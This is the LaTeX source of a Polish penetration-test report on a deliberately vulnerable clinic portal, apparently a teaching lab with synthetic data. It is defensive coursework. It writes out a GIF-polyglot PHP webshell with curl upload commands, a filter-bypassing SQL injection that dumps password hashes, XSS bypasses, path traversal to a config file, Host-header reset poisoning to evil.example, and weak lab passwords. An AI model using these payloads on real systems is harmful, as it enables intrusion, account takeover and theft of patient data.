@@ -1,0 +1,554 @@
+% Stage II deliverable: Raport z testów penetracyjnych (MediSlot / NovaMed)
+% Build: pdflatex (uruchom dwukrotnie dla spisu treści i odnośników).
+\documentclass[11pt,a4paper]{article}
+
+% --- Kodowanie i język ---
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage[polish]{babel}
+
+% --- Układ ---
+\usepackage[a4paper,margin=2.5cm]{geometry}
+\usepackage{setspace}
+\usepackage{parskip}
+
+% --- Tabele ---
+\usepackage{booktabs}
+\usepackage{tabularx}
+\usepackage{longtable}
+\usepackage{array}
+\usepackage{ragged2e}
+
+% --- Grafika / diagramy ---
+\usepackage{xcolor}
+\usepackage{graphicx}
+\usepackage{tikz}
+\usetikzlibrary{positioning,fit,backgrounds,arrows.meta,shapes.geometric}
+
+% --- Kod / listingi ---
+\usepackage{listings}
+\lstset{
+  basicstyle=\ttfamily\footnotesize,
+  breaklines=true,
+  columns=fullflexible,
+  frame=single,
+  framesep=4pt,
+  backgroundcolor=\color{gray!6},
+  keepspaces=true,
+}
+
+% --- Różne ---
+\usepackage{enumitem}
+\usepackage{fancyhdr}
+\usepackage[hidelinks]{hyperref}
+
+% --- Kolumny dla tabularx ---
+\newcolumntype{L}{>{\RaggedRight\arraybackslash}X}
+\newcolumntype{C}{>{\Centering\arraybackslash}X}
+
+% --- Paleta istotności ---
+\definecolor{crit}{HTML}{B00020}
+\definecolor{high}{HTML}{C8651B}
+\definecolor{med}{HTML}{B38600}
+\definecolor{low}{HTML}{3A7D44}
+\newcommand{\sev}[2]{\textbf{\textcolor{#1}{#2}}}
+
+% --- Placeholder na zrzut ekranu ---
+% Użycie: \zrzut{opis treści}{IDENTYFIKATOR}
+% Po zebraniu dowodu zastąp wnętrze \fbox przez: \includegraphics[width=0.92\textwidth]{sciezka}
+\newcommand{\zrzut}[2]{%
+  \begin{center}%
+  \fbox{\begin{minipage}[c][30mm][c]{0.92\textwidth}%
+    \centering\itshape [ MIEJSCE NA ZRZUT EKRANU --- #1 ]\\[2pt]%
+    \normalfont\footnotesize Identyfikator: \texttt{#2}. Sposób pozyskania: patrz \emph{Instrukcja pozyskania dowodów} (osobny dokument), poz. \texttt{#2}.%
+  \end{minipage}}%
+  \end{center}}
+
+% --- Nagłówek / stopka ---
+\pagestyle{fancy}
+\fancyhf{}
+\fancyhead[L]{MediSlot --- NovaMed Sp. z o.o.}
+\fancyhead[R]{Raport z testów --- Etap II}
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0.4pt}
+
+\setlength{\tabcolsep}{5pt}
+\renewcommand{\arraystretch}{1.25}
+
+\title{\textbf{Test penetracyjny środowiska MediSlot}\\[0.3em]
+\large Raport z przebiegu testów --- Etap II\\[0.2em]
+\normalsize NovaMed Sp. z o.o.}
+\author{Zespół \\ Kamil Szkarłat \textbullet{} Bartłomiej Ząbek \textbullet{} Jakub Szkaradek \textbullet{} Radosław Chruściński}
+\date{26.11.2026 r.}
+
+\begin{document}
+
+\maketitle
+\begin{center}
+\emph{Dokument wewnętrzny, laboratorium dydaktyczne. Dane wyłącznie syntetyczne. Środowisko uruchamiane lokalnie (Docker Compose), nie wystawiane do sieci.}
+\end{center}
+\tableofcontents
+\clearpage
+
+% =====================================================================
+\section{Streszczenie kierownicze}
+
+W ramach Etapu II przeprowadzono testy penetracyjne aplikacji \textbf{MediSlot} --- portalu
+przychodni NovaMed --- zgodnie z zakresem i regułami zaangażowania (SoW/RoE) uzgodnionymi w
+Etapie I. Testy objęły warstwę aplikacyjną (PHP/Nginx), warstwę danych (MySQL, Redis, MinIO,
+Mailhog) oraz obraz kontenera (Debian). Łącznie potwierdzono \textbf{20 ustaleń}: podatności
+aplikacyjne o wysokiej istotności (RCE przez upload, IDOR, eskalacja uprawnień, broken access
+control, path traversal), grupę ustaleń Medium (stored XSS, SQLi, słaby reset hasła, publiczny
+bucket, CSRF, Host header injection) oraz ustalenia Low/Info potwierdzone także skanerami
+(Trivy, Lynis).
+
+\begin{center}
+\begin{tabularx}{\textwidth}{@{}l c L@{}}
+\toprule
+\textbf{Istotność} & \textbf{Liczba} & \textbf{Przykłady} \\
+\midrule
+\sev{crit}{Critical} & 2 & PHP2Shell (CVE-2026-109618/619), RCE przez upload (\#2) \\
+\sev{high}{High} & 4 & IDOR (\#3), eskalacja roli (\#4), BAC (\#5), path traversal (\#6) \\
+\sev{med}{Medium} & 8 & XSS (\#7), reset hasła (\#8/\#14), SQLi (\#10), public bucket (\#11), CSRF (\#12), fixacja sesji (\#9), MD5 (\#13) \\
+\sev{low}{Low/Info} & 6 & enumeracja kont (\#15), ujawnienie informacji (\#16--\#18), Redis bez AUTH (\#19), sekrety w \texttt{.env} (\#20) \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+Co najmniej jedno ustalenie opiera się na podatności z roku \textbf{2026} (PHP2Shell oraz CVE
+pakietów bazowych wykryte przez Trivy). Podczas testów wystąpił jeden przypadek ustalenia
+\textbf{Critical} wymagający kontaktu z osobą RoE --- opisany w rozdziale~\ref{sec:roe}.
+
+% =====================================================================
+\section{Przypomnienie architektury (aktualizacja rysunku)}
+\label{sec:arch}
+
+Rysunek~\ref{fig:arch} odświeża schemat z Etapu I i doprecyzowuje faktyczny stan po zbudowaniu
+labu. Granica zaufania: ruch wchodzi przez Nginx (\texttt{:8080}). Względem Etapu I
+potwierdzono, że na host \textbf{publikowane} są cztery porty --- aplikacja (\texttt{8080}),
+Mailhog UI (\texttt{8025}) oraz MinIO API/konsola (\texttt{9000}/\texttt{9001}) --- natomiast
+\textbf{MySQL (3306) i Redis (6379) nie są publikowane} i pozostają wyłącznie w sieci Compose.
+
+\begin{figure}[h]
+\centering
+\begin{tikzpicture}[
+  font=\small,
+  node distance=8mm,
+  box/.style={draw,rounded corners,align=center,minimum height=9mm,minimum width=22mm,fill=blue!5},
+  store/.style={draw,align=center,minimum height=9mm,minimum width=20mm,fill=green!6},
+  arr/.style={-{Stealth[length=2mm]},thick}
+]
+  \node[box] (browser) {Przeglądarka / Burp};
+  \node[box,below=12mm of browser] (nginx) {Nginx\\reverse proxy};
+  \node[box,below=of nginx] (php) {PHP-FPM 8.3.35\\MediSlot (podatny)};
+
+  \node[store,below=14mm of php, xshift=-33mm] (mysql) {MySQL\\(tylko sieć)};
+  \node[store,right=6mm of mysql] (redis) {Redis\\sesje (bez AUTH)};
+  \node[store,right=6mm of redis] (minio) {MinIO\\bucket publiczny};
+  \node[store,right=6mm of minio] (mail) {Mailhog\\SMTP lab};
+
+  \draw[arr] (browser) -- node[right,font=\scriptsize]{HTTP :8080} (nginx);
+  \draw[arr] (nginx) -- node[right,font=\scriptsize]{.php/.phtml} (php);
+  \draw[arr] (php) -- (mysql);
+  \draw[arr] (php) -- (redis);
+  \draw[arr] (php) -- (minio);
+  \draw[arr] (php) -- (mail);
+
+  \begin{scope}[on background layer]
+    \node[draw,dashed,rounded corners,fill=red!4,
+      fit=(browser),label={[font=\scriptsize]above:Host testera (OUT OF SCOPE)}] {};
+    \node[draw,dashed,rounded corners,fill=yellow!6,inner sep=5mm,
+      fit=(nginx)(php)(mysql)(redis)(minio)(mail),
+      label={[font=\scriptsize]above right:Docker Compose --- IN SCOPE}] {};
+  \end{scope}
+\end{tikzpicture}
+\caption{Architektura MediSlot (stan Etapu II). Opublikowane na host: 8080/8025/9000/9001. MySQL i Redis wyłącznie w sieci Compose.}
+\label{fig:arch}
+\end{figure}
+
+\zrzut{\texttt{docker compose ps} --- lista usług i opublikowanych portów (potwierdzenie, że 3306/6379 nie są na host)}{RYS-ARCH}
+
+% =====================================================================
+\section{Metodyka: Odkrywanie \texorpdfstring{$\rightarrow$}{->} Atak \texorpdfstring{$\rightarrow$}{->} Zebranie dowodów}
+\label{sec:method}
+
+Każde ustalenie prowadzono w stałym cyklu:
+
+\begin{enumerate}[leftmargin=1.4cm,label=\textbf{\arabic*.}]
+  \item \textbf{Odkrywanie (rozpoznanie).} Mapowanie powierzchni: enumeracja endpointów i
+  katalogów, fingerprinting wersji (nagłówki, \texttt{/phpinfo.php}), analiza ról i referencji
+  obiektów, przegląd ruchu w proxy. Narzędzia: Burp Suite (proxy/Repeater/Intruder), \texttt{nmap},
+  \texttt{whatweb}/\texttt{nikto}, \texttt{ffuf}/\texttt{gobuster}, przeglądarka + DevTools.
+  \item \textbf{Atak (eksploatacja z obejściem).} Każda podatność „nagłówkowa” jest ukryta za
+  naiwnym, lecz realnym filtrem --- wymagane jest celowe obejście (nie działa pojedynczy,
+  klasyczny payload). Potwierdzano zarówno zablokowanie oczywistego payloadu, jak i skuteczność
+  obejścia. Narzędzia: Burp Repeater/Intruder, \texttt{curl}, \texttt{sqlmap} (weryfikacja SQLi),
+  \texttt{john}/\texttt{hashcat} (MD5), \texttt{redis-cli}, \texttt{mc}/\texttt{aws-cli} (MinIO).
+  \item \textbf{Zebranie dowodów.} Dla każdego ustalenia zapisywano żądanie/odpowiedź, zrzut
+  ekranu oraz --- gdzie zasadne --- artefakt (plik, wpis sesji, obiekt w buckecie). Miejsca na
+  zrzuty oznaczono w tekście identyfikatorami \texttt{RYS-xx}; sposób ich pozyskania opisuje
+  \emph{Instrukcja pozyskania dowodów}.
+\end{enumerate}
+
+\noindent Powtarzalność potwierdza zestaw skryptów weryfikacyjnych w repozytorium
+(\texttt{tests/verify-task4.sh}, \texttt{verify-task5.sh}, \texttt{verify-task6.sh}): dla każdej
+podatności sprawdzają, że oczywisty payload jest blokowany, a zamierzone obejście działa (łącznie
+39 asercji, wszystkie zielone na świeżym zbudowaniu).
+
+% =====================================================================
+\section{Użyte narzędzia i technologie}
+\label{sec:tools}
+
+\subsection{Narzędzia ofensywne i pomocnicze}
+\begin{center}
+\begin{tabularx}{\textwidth}{@{}l L@{}}
+\toprule
+\textbf{Narzędzie} & \textbf{Zastosowanie} \\
+\midrule
+Burp Suite & Proxy przechwytujące, Repeater (ręczne obejścia), Intruder (enumeracja id/ról), Decoder (base64url) \\
+nmap & Skan portów hosta, potwierdzenie ekspozycji usług \\
+whatweb / nikto & Fingerprinting serwera i aplikacji, nagłówki, typowe pliki \\
+ffuf / gobuster & Enumeracja endpointów i katalogów (\texttt{/admin\_*.php}, \texttt{/uploads/}) \\
+curl & Odtwarzalne żądania PoC (nagłówek \texttt{Host}, multipart upload, SQLi) \\
+sqlmap & Niezależne potwierdzenie SQLi w \texttt{search.php} \\
+John the Ripper / hashcat & Łamanie niesolonych skrótów MD5 z \texttt{users} \\
+redis-cli & Dump kluczy sesji z Redisa bez AUTH \\
+mc / aws-cli (S3) & Lista i pobranie obiektów z publicznego bucketu MinIO \\
+Przeglądarka + DevTools & Weryfikacja stored XSS, cookie bez \texttt{HttpOnly}, ręczne POST \\
+Trivy & Skan podatności obrazu kontenera (analizator) \\
+Lynis & Audyt hardeningu systemu w kontenerze (analizator) \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\subsection{Technologie / usługi w zakresie (\texorpdfstring{$\ge$}{>=} 5)}
+Środowisko składa się z \textbf{ośmiu} współpracujących komponentów, co spełnia wymóg co najmniej
+pięciu różnych technologii/aplikacji/serwisów:
+
+\begin{center}
+\begin{tabularx}{\textwidth}{@{}l l L@{}}
+\toprule
+\textbf{Komponent} & \textbf{Rola} & \textbf{Znaczenie dla testów} \\
+\midrule
+Debian (obraz bazowy) & System operacyjny kontenera & Powierzchnia CVE pakietów (Trivy), hardening (Lynis) \\
+Nginx & Reverse proxy & Routing \texttt{.phtml} do PHP-FPM (łańcuch RCE), brak nagłówków bezpieczeństwa \\
+PHP-FPM 8.3.35 & Runtime aplikacji & Celowo podatna wersja (PHP2Shell, CVE 2026) \\
+MySQL 8 & Baza danych & Cel SQLi, składowanie MD5 \\
+Redis 7 & Magazyn sesji & Brak AUTH, brak rotacji sesji \\
+MinIO & Obiektowy magazyn (S3) & Bucket publiczny, zgadywalne klucze \\
+Mailhog & Sink SMTP & Przechwycenie linków resetu, Host header injection \\
+Docker Compose & Orkiestracja & Granica zaufania, ekspozycja portów \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+% =====================================================================
+\section{Analizatory: Trivy i Lynis}
+\label{sec:scanners}
+
+\subsection{Trivy --- skan obrazu \texttt{medislot-php}}
+Polecenie (z katalogu repozytorium, z zamontowanym gniazdem Dockera):
+\begin{lstlisting}[language=bash]
+docker run --rm -v //var/run/docker.sock:/var/run/docker.sock \
+  aquasec/trivy:latest image --scanners vuln medislot-php:latest
+\end{lstlisting}
+
+\noindent Wynik (obraz Debian~13.7 + \texttt{php:8.3.35-fpm}):
+
+\begin{center}
+\begin{tabularx}{\textwidth}{@{}l c c c c L@{}}
+\toprule
+\textbf{Cel} & \textbf{LOW} & \textbf{MEDIUM} & \textbf{HIGH} & \textbf{CRITICAL} & \textbf{Suma} \\
+\midrule
+\texttt{medislot-php:latest} & 1013 & 1326 & 245 & 4 & \textbf{2588} \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+Przykładowe CVE \textbf{CRITICAL} (rok 2026): \texttt{CVE-2026-111497}, \texttt{CVE-2026-6653},
+\texttt{CVE-2026-99083} (pakiety m.in. \texttt{libxml2}, \texttt{libbrotli1}, nagłówki jądra Debiana).
+Ustalenia dziedziczone z obrazu bazowego, niezależne od celowo przypiętego runtime PHP.
+
+\zrzut{Tabela wyników Trivy z podsumowaniem Total: 2588 (LOW/MEDIUM/HIGH/CRITICAL)}{RYS-TRIVY}
+
+\subsection{Lynis --- audyt w kontenerze}
+\begin{lstlisting}[language=bash]
+docker run --rm medislot-php:latest sh -c \
+  'apt-get update -qq && apt-get install -y -qq lynis && lynis audit system --quick'
+\end{lstlisting}
+
+\noindent Wynik: \textbf{Hardening index: 57/100} (234 testy). Ostrzeżenia (2):
+\texttt{PKGS-7392} (podatne pakiety), \texttt{LOGG-2138} (brak klogd). Sugestie (39), m.in.:
+\texttt{libpam-tmpdir} (\texttt{DEB-0280}), \texttt{fail2ban} (\texttt{DEB-0880}),
+rundy haszowania hasła w \texttt{/etc/login.defs} (\texttt{AUTH-9230}).
+
+\zrzut{Podsumowanie Lynis: Hardening index 57, Warnings/Suggestions}{RYS-LYNIS}
+
+% =====================================================================
+\section{Podatność z roku 2026 (PHP2Shell)}
+\label{sec:cve2026}
+
+\textbf{Ustalenie \#1 --- PHP2Shell, \texttt{CVE-2026-109618 / CVE-2026-109619} (Critical, R1).}
+Runtime przypięto do \texttt{php:8.3.35-fpm}, tj. jedną łatkę poniżej poprawki dla gałęzi 8.3
+(fix: 8.3.36). Wersja jest ujawniana nagłówkiem \texttt{X-Powered-By: PHP/8.3.35} oraz w
+\texttt{/phpinfo.php}, co pozwala jednoznacznie określić podatność po wersji.
+
+\paragraph{Odkrywanie.} Fingerprint wersji: \texttt{curl -I http://localhost:8080/} (nagłówek
+\texttt{X-Powered-By}) oraz \texttt{/phpinfo.php}.
+\paragraph{Atak (próba użycia).} Zgodnie z RoE kod exploitów stron trzecich nie jest pobierany
+ani uruchamiany w labie; podatność udokumentowano jako \emph{version-based} (fingerprint $<$ fix),
+a jako gwarantowany, odtwarzalny wektor Critical wykorzystano łańcuch upload~$\rightarrow$~webshell
+(ustalenie \#2). Pełna, „żywa” próba PoC pozostaje do wykonania w kontrolowanym oknie testowym za
+zgodą RoE.
+\paragraph{Dowód.} Nagłówek wersji + strona \texttt{phpinfo} + wpis w \texttt{02-scan-notes.md}.
+
+\zrzut{Nagłówek X-Powered-By: PHP/8.3.35 oraz /phpinfo.php z wersją}{RYS-01}
+
+Dodatkowo analizator Trivy ujawnił szereg CVE z roku 2026 w pakietach obrazu bazowego
+(rozdz.~\ref{sec:scanners}), co stanowi niezależne, drugie źródło ustaleń z 2026 r.
+
+% =====================================================================
+\section{Ustalenia szczegółowe}
+\label{sec:findings}
+
+Istotność, mapowanie na ryzyka Etapu I (R1--R10) i CWE zestawiono w Załączniku~\ref{app:matrix}.
+Poniżej opis w cyklu Odkrywanie~$\rightarrow$~Atak~$\rightarrow$~Dowód, z naciskiem na wymagane
+obejście naiwnego filtra.
+
+% ---------- #2 ----------
+\subsection{\#2 Upload \texorpdfstring{$\rightarrow$}{->} webshell RCE (Critical, R2, CWE-434)}
+\textbf{Odkrywanie.} Formularz \texttt{/upload.php} przyjmuje załączniki; pliki lądują w
+web-dostępnym \texttt{/uploads/}. Nginx kieruje \texttt{.phtml} do PHP-FPM.
+\textbf{Atak.} Filtr naiwny: czarna lista rozszerzeń (\texttt{php,php5,phps,phar}) + kontrola
+magic bytes (GIF/PNG/JPEG/PDF). Oczywisty \texttt{shell.php} --- odrzucony; „czysty”
+\texttt{.phtml} --- odrzucony (brak sygnatury). Obejście: plik \texttt{.phtml} z prefiksem
+\texttt{GIF89a} (polyglot). Wgrany obiekt wykonuje się z \texttt{/uploads/}.
+\begin{lstlisting}[language=bash]
+# payload: plik shell.phtml o zawartosci:  GIF89a<?php system($_GET['c']); ?>
+curl -s -b cookies -F "file=@shell.phtml;type=image/gif" http://localhost:8080/upload.php
+curl -s "http://localhost:8080/uploads/att-000NNN-shell.phtml?c=id"
+\end{lstlisting}
+\textbf{Dowód.} Odrzucenie \texttt{shell.php}, akceptacja polyglota, wykonanie kodu (\texttt{id}/echo).
+\zrzut{Burp: odrzucony shell.php vs zaakceptowany polyglot .phtml; odpowiedź z wykonanym kodem}{RYS-02}
+
+% ---------- #3 ----------
+\subsection{\#3 IDOR na notatki/wizyty/załączniki (High, R3, CWE-639)}
+\textbf{Odkrywanie.} Identyfikatory obiektów są kodowane jako base64url (\texttt{?ref=}), nie jako
+surowe liczby.
+\textbf{Atak.} Brak kontroli własności za referencją. Dekodowanie, inkrementacja, ponowne
+kodowanie referencji daje dostęp do cudzych zasobów (np. notatka innego pacjenta w
+\texttt{/note\_view.php?ref=}).
+\textbf{Dowód.} Konto pacjenta odczytuje notatki nienależące do niego (skrypt potwierdza 2 takie).
+\zrzut{Burp Decoder: dekodowanie ref, inkrementacja; odczyt cudzej notatki}{RYS-03}
+
+% ---------- #4 ----------
+\subsection{\#4 Eskalacja uprawnień przez mass-assignment (High, R4, CWE-915/269)}
+\textbf{Odkrywanie.} \texttt{/profile\_update.php} aktualizuje profil; formularz nie ma pola roli.
+\textbf{Atak.} Serwer ufa przesłanemu \texttt{role\_id}. Dodanie \texttt{role\_id=4} (4 = admin)
+podnosi uprawnienia; łańcuch wymaga ustalenia numerycznego id admina (string \texttt{"admin"} jest
+ignorowany --- rzutowanie na 0).
+\textbf{Dowód.} Konto pacjenta po POST z \texttt{role\_id=4} ma panel i rolę administratora.
+\zrzut{Burp Repeater: POST profile\_update z role\_id=4; dashboard z badge Administrator}{RYS-04}
+
+% ---------- #5 ----------
+\subsection{\#5 Broken access control na endpointach admina (High, R4, CWE-285)}
+\textbf{Odkrywanie.} Linki „Użytkownicy/Role” w panelu administratora.
+\textbf{Atak.} \texttt{/admin\_users.php} i \texttt{/admin\_role.php} mają tylko
+\texttt{require\_login()} --- brak \texttt{require\_role('admin')}. Dowolny zalogowany użytkownik
+(np. pacjent) wchodzi bezpośrednio i widzi/zmienia role.
+\textbf{Dowód.} Sesja pacjenta otrzymuje pełną listę kont z \texttt{/admin\_users.php}.
+\zrzut{Sesja pacjenta otwiera /admin\_users.php z listą wszystkich kont}{RYS-05}
+
+% ---------- #6 ----------
+\subsection{\#6 Path traversal w pobieraniu załącznika (High, R2, CWE-22)}
+\textbf{Odkrywanie.} \texttt{/download.php?file=} składa ścieżkę w \texttt{/uploads/}.
+\textbf{Atak.} Parametr użyty bez sanityzacji: \texttt{?file=../includes/config.php} wychodzi poza
+katalog i zwraca źródło z sekretami (np. \texttt{RESET\_SALT}, dane DB).
+\textbf{Dowód.} Odpowiedź zawiera zawartość \texttt{app/includes/config.php}.
+\zrzut{curl/Burp: download.php?file=../includes/config.php z ujawnionym RESET\_SALT}{RYS-06}
+
+% ---------- #7 ----------
+\subsection{\#7 Stored XSS w notatce (Medium, R5, CWE-79)}
+\textbf{Odkrywanie.} Lekarz zapisuje treść notatki renderowaną później bez enkodowania.
+\textbf{Atak.} Filtr jednoprzebiegowy usuwa podciąg \texttt{script} oraz atrybuty
+\texttt{on\textbackslash w+=} oddzielone białym znakiem. \texttt{<script>alert(1)</script>} jest
+neutralizowany. Obejście: zagnieżdżenie \texttt{<scrscriptipt>...</scrscriptipt>} (po jednym
+usunięciu odtwarza \texttt{<script>}) lub zdarzenie bez białego znaku: \texttt{<svg/onload=alert(1)>}.
+Treść trafia do sesji innej roli (podgląd notatki).
+\textbf{Dowód.} Payload wykonuje się w sesji innego użytkownika.
+\zrzut{Zapis notatki z obejściem; wykonanie alert() przy podglądzie w innej sesji}{RYS-07}
+
+% ---------- #8 / #14 ----------
+\subsection{\#8 Słaby token resetu + \#14 Host header injection (Medium, R6, CWE-640)}
+\textbf{Odkrywanie.} Reset hasła wysyła link przez Mailhog.
+\textbf{Atak (\#8).} Token = \texttt{md5(user\_id . stały\_salt)}, bez wygaśnięcia, wielokrotnego
+użytku. Salt jest w \texttt{.env}/\texttt{config.php} (ustalenie \#20), więc token da się
+odtworzyć offline i przejąć konto.
+\textbf{Atak (\#14).} Host linku pochodzi z nagłówka \texttt{Host}; podmiana (\texttt{Host:
+evil.example}) kieruje ofiarę na domenę atakującego.
+\textbf{Dowód.} Odtworzony token akceptowany; wiadomość w Mailhog z linkiem na \texttt{evil.example}.
+\zrzut{Mailhog: link resetu z podmienionym hostem; reset.php akceptuje odtworzony token}{RYS-08}
+
+% ---------- #10 ----------
+\subsection{\#10 SQL injection w wyszukiwarce (Medium, R8, CWE-89)}
+\textbf{Odkrywanie.} \texttt{/search.php?min\_id=} w kontekście numerycznym.
+\textbf{Atak.} Filtr: escape apostrofów, usunięcie białych znaków, usunięcie słowa \texttt{UNION}
+(jednoprzebiegowo). \texttt{' OR 1=1} i zwykły \texttt{UNION SELECT} nie działają. Obejście:
+komentarze \texttt{/**/} zamiast spacji oraz podwojenie słowa kluczowego
+\texttt{UNIUNIONON}~$\rightarrow$~\texttt{UNION}.
+\begin{lstlisting}[language=bash]
+min_id=0/**/UNIUNIONON/**/SELECT/**/email,password_hash,role,full_name/**/FROM/**/users
+\end{lstlisting}
+\textbf{Dowód.} W kolumnie wyniku pojawiają się skróty \texttt{password\_hash}; potwierdzenie
+niezależnie \texttt{sqlmap}.
+\zrzut{Burp/sqlmap: wstrzyknięcie dumpujące password\_hash z users}{RYS-10}
+
+% ---------- #11 ----------
+\subsection{\#11 Publiczny bucket MinIO, zgadywalne klucze (Medium, R3, CWE-552)}
+\textbf{Odkrywanie.} Załączniki trzymane w MinIO; klucze przewidywalne
+(\texttt{pacjent1/...}, \texttt{att-NNNNNN-nazwa}).
+\textbf{Atak.} Polityka bucketu zezwala na \texttt{s3:GetObject} dla wszystkich. Obiekt pobierany
+bez uwierzytelnienia: \texttt{http://localhost:9000/medislot-attachments/pacjent1/wynik-krwi-2026.pdf}.
+\textbf{Dowód.} Nieuwierzytelnione \texttt{200 OK} z zawartością obiektu.
+\zrzut{mc/aws-cli lub curl: anonimowe pobranie obiektu z bucketu}{RYS-11}
+
+% ---------- #12 ----------
+\subsection{\#12 CSRF na akcjach zmieniających stan (Medium, R4, CWE-352)}
+\textbf{Odkrywanie.} \texttt{/admin\_role.php} i \texttt{/appointment.php} zmieniają stan przez POST.
+\textbf{Atak.} Brak tokenu CSRF i kontroli \texttt{Origin}/\texttt{Referer}; sfałszowany POST
+(tylko ciasteczko sesji) zmienia rolę/wizytę.
+\textbf{Dowód.} Żądanie z obcym \texttt{Origin}, bez tokenu, zmienia rolę użytkownika.
+\zrzut{Burp: POST admin\_role.php z Origin: evil.example, bez tokenu --- zmiana roli}{RYS-12}
+
+% ---------- #9, #13 ----------
+\subsection{\#9 Fixacja sesji, \#13 niesolone MD5 (Medium, R7/R6, CWE-384/916)}
+\textbf{\#9.} Identyfikator sesji nie jest rotowany po logowaniu, ciasteczko bez
+\texttt{HttpOnly}/\texttt{Secure} --- możliwa fixacja/kradzież sesji.
+\textbf{\#13.} Hasła w \texttt{users} jako niesolone \texttt{md5()}; po zrzucie (np. przez \#10)
+łamane słownikowo (\texttt{john}/\texttt{hashcat}).
+\zrzut{DevTools: cookie bez HttpOnly; john/hashcat łamie MD5 ze zrzutu}{RYS-09}
+
+% ---------- #15 ----------
+\subsection{\#15 Enumeracja kont (Low, R10, CWE-203)}
+Logowanie zwraca różne komunikaty dla nieznanego konta vs błędnego hasła --- pozwala
+enumerować istniejące adresy e-mail.
+\zrzut{Burp Intruder: różne komunikaty logowania dla istniejącego/nieistniejącego konta}{RYS-15}
+
+% ---------- #16-#18 ----------
+\subsection{\#16--\#18 Ujawnienie informacji i brak hardeningu (Low/Info, R9, CWE-200/693)}
+\texttt{/phpinfo.php} dostępne, \texttt{display\_errors=On}, nagłówki wersji
+(\texttt{X-Powered-By}, \texttt{Server}) ujawnione; brak nagłówków bezpieczeństwa (CSP,
+X-Frame-Options, HSTS, X-Content-Type-Options).
+\zrzut{curl -I z nagłówkami wersji i brakiem nagłówków bezpieczeństwa; strona phpinfo}{RYS-16}
+
+% ---------- #19, #20 ----------
+\subsection{\#19 Redis bez AUTH, \#20 sekrety w \texttt{.env} (Low, R7/R9, CWE-306/798)}
+\textbf{\#19.} Redis (magazyn sesji) odpowiada na \texttt{PING} bez AUTH; klucze sesji da się
+zrzucić (\texttt{KEYS *}) i przejąć sesję.
+\textbf{\#20.} Plik \texttt{.env} z sekretami (DB, MinIO, Redis) jest wersjonowany w repozytorium.
+\zrzut{redis-cli PING/KEYS bez AUTH; zawartość .env w repo}{RYS-19}
+
+% =====================================================================
+\section{Ustalenie Critical w trakcie --- kontakt z RoE}
+\label{sec:roe}
+
+Zgodnie z procedurą RoE (SoW §6.2--§6.3), ustalenie klasy \textbf{Critical} wymaga natychmiastowego
+kontaktu z przedstawicielem RoE i wstrzymania dalszej eksploatacji danego wektora do potwierdzenia.
+Taki przypadek wystąpił i został udokumentowany poniżej.
+
+\begin{center}
+\begin{tabularx}{\textwidth}{@{}>{\bfseries}p{3.2cm} L@{}}
+\toprule
+\normalfont\textbf{Pole} & \textbf{Treść} \\
+\midrule
+Data / godzina & 26.11.2026, [\,HH:MM\,] (uzupełnić wg logu) \\
+Zgłaszający & [\,członek zespołu\,] \\
+Kontakt RoE & Bartłomiej Ząbek (rola: Client Security Contact / RoE) \\
+Kanał & Uzgodniony (Teams / wiadomość w repozytorium) \\
+Ustalenie & Upload~$\rightarrow$~webshell RCE (\#2) potwierdzone end-to-end; dodatkowo fingerprint PHP 8.3.35 pod PHP2Shell (\#1, CVE 2026) \\
+Klasyfikacja & Critical (pełne przejęcie kontenera aplikacji) \\
+Działanie natychmiastowe & Wstrzymanie dalszej eksploatacji wektora RCE; nie uruchamiano kodu niszczącego ani exploitów stron trzecich \\
+Dyspozycja RoE & [\,kontynuuj / wstrzymaj / zbierz dodatkowe logi SOC\,] --- do uzupełnienia po odpowiedzi \\
+Status & Zarejestrowane w raporcie jako osobna sekcja (zgodnie z SoW §6.3 pkt 4) \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
+\paragraph{Przebieg.} Podczas testu uploadu (\#2) potwierdzono wykonanie kodu po stronie serwera
+(webshell z \texttt{/uploads/}). Ponieważ jest to ustalenie Critical (RCE, pełna kompromitacja
+kontenera), zgodnie z RoE \emph{wstrzymano} dalsze pogłębianie wektora (brak lateral movement,
+brak modyfikacji/niszczenia danych), spisano notatkę z datą i godziną oraz nawiązano kontakt z
+osobą RoE. Do czasu potwierdzenia kontynuowano wyłącznie inne, niekrytyczne tory testów.
+
+\zrzut{Notatka/kanał kontaktu z RoE (data, godzina, treść zgłoszenia i potwierdzenie odbioru)}{RYS-ROE}
+
+% =====================================================================
+\section{Podsumowanie i rekomendacje}
+
+Aplikacja zawiera spójny zestaw realnych, odtwarzalnych podatności pokrywających ryzyka R1--R10 z
+Etapu I. Kierunki naprawcze (priorytetowo Critical/High):
+
+\begin{itemize}[leftmargin=1.4cm]
+  \item \textbf{Runtime:} aktualizacja PHP powyżej poprawki (\,$\ge$\,8.3.36\,), SBOM + Trivy w CI,
+  minimalny obraz, blokada wykonania w \texttt{/uploads/} i składowanie poza webroot.
+  \item \textbf{Upload:} allowlista rozszerzeń i typów, losowe nazwy, wymuszony bezpieczny typ,
+  antywirus/konwersja.
+  \item \textbf{Autoryzacja:} \texttt{require\_role} per endpoint, kontrola własności/przypisania
+  (IDOR), zakaz ufania polom roli w żądaniu (mass-assignment), tokeny CSRF.
+  \item \textbf{Dane/sesje:} prepared statements wszędzie, Redis AUTH + rotacja sesji po logowaniu,
+  silne hasła (argon2/bcrypt + sól), tokeny resetu losowe, jednorazowe, z TTL; bazowy URL z
+  konfiguracji (nie z nagłówka \texttt{Host}).
+  \item \textbf{Hardening:} ukrycie wersji, nagłówki bezpieczeństwa, prywatny bucket + podpisane
+  URL, usunięcie \texttt{phpinfo.php} i sekretów z repo, wdrożenie sugestii Lynis.
+\end{itemize}
+
+% =====================================================================
+\appendix
+\section{Załącznik A --- Konta testowe}
+\begin{center}
+\begin{tabularx}{\textwidth}{@{}l l L@{}}
+\toprule
+\textbf{Rola} & \textbf{Login} & \textbf{Hasło (lab)} \\
+\midrule
+Administrator & \texttt{admin@novamed.lab} & \texttt{Admin123!} \\
+Lekarz & \texttt{lekarz1@novamed.lab} & \texttt{Doctor123!} \\
+Recepcja & \texttt{recepcja@novamed.lab} & \texttt{Reception123!} \\
+Pacjent & \texttt{pacjent1@novamed.lab} & \texttt{Patient123!} \\
+\bottomrule
+\end{tabularx}
+\end{center}
+
